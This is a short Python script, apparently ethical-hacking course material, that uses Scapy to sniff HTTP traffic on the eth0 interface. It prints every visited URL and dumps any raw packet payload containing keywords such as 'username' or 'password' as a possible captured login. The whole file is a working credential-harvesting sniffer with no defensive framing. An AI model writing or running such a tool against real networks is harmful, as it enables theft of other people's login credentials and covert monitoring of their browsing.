import scapy.all as scapy
from scapy.layers import http

# 1. using built in scapy function to sniff the interface
def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

# 2. function to filter login info
def get_login_info(packet):
    if  packet.haslayer(scapy.Raw):
            load =packet[scapy.Raw].load
            keywords=([b"username",b"password",b"login",b"pass",b"user"])
            for i in keywords:
                if i in load:
                   return load

# 3. function to get all visited urls
def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path   

# 4. main function to process each sniffed packet
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print(f"HTTP url >>{url}")
        login_info = get_login_info(packet)
        if login_info:
            print(f"[*]Possible username/password ->{login_info}")
             
        
# 5. calling the sniffing function on interface: eht0
sniff("eth0")

